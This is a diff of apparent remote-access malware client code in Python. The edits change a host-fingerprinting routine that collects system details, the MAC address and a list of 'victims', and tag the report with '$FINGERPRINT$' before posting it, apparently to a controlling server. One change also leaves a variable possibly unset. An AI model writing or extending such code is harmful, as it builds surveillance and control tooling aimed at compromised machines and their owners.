@@ -1,4 +1,3 @@
-#!/usr/bin/python3
 from time import time,sleep
 from socket import socket as sock,AF_INET,SOCK_STREAM,error as sock_error
 from ssl import wrap_socket as ssl_wrap
@@ -78,7 +77,8 @@ def address(verbose=False):
         print(e)
 def fingerprint(verbose=False):
     try:
-        from platform import uname,architecture,platform,python_build,python_implementation,win32_ver
+        global victims
+        from platform import uname,architecture,platform,python_build,python_implementation,win32_ver, linux_distribution
         from uuid import getnode as get_mac
         from os import listdir
         d=uname()
@@ -112,10 +112,11 @@ def fingerprint(verbose=False):
             victims=list(set(victims))
         except UnboundLocalError:
             pass
-        qproc="multi-core" if multiprocessor else "single-core"
+        if multiprocessor is not None:
+            qproc="multi-core" if multiprocessor else "single-core"
         computer=node+" "+str(victims)+": "+platform+" "+machine+" "+architecture["bits"]+" "+qproc+" ["+mac+"]"
         if verbose:
-            post(computer,True)
+            post("$FINGERPRINT$" + computer,True)
     except Exception as e:
         if verbose:
             post("Fingerprinting failed.",True)
